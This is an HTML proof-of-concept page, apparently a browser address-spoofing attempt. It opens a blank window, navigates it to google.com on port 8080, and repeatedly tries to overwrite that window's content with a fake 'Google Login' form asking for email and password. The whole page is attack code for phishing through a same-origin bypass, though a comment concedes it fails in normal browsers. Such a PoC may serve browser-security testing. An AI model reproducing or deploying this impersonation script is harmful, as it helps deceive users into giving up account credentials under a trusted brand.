<!DOCTYPE html>
<html>
<body>
<button onclick="go()">Go</button>

<script>
function go() {
    // Step 1: buka about:blank (same-origin)
    let w = window.open('about:blank', '_blank');

    // Step 2: langsung navigate ke trusted domain
    w.location.href = 'https://www.google.com:8080';

    // Step 3: polling sampai DOM bisa diakses
    let i = setInterval(() => {
        try {
            if (w.document && w.document.body) {
                clearInterval(i);

                // Step 4: overwrite DOM
                w.document.open();
                w.document.write(`
                    <h1>Google Login</h1>
                    <input placeholder="Email"><br>
                    <input type="password" placeholder="Password"><br>
                    <button>Login</button>
                `);
                w.document.close();
            }
        } catch(e) {
            // expected in normal browsers
        }
    }, 50);
}
</script>
</body>
</html>
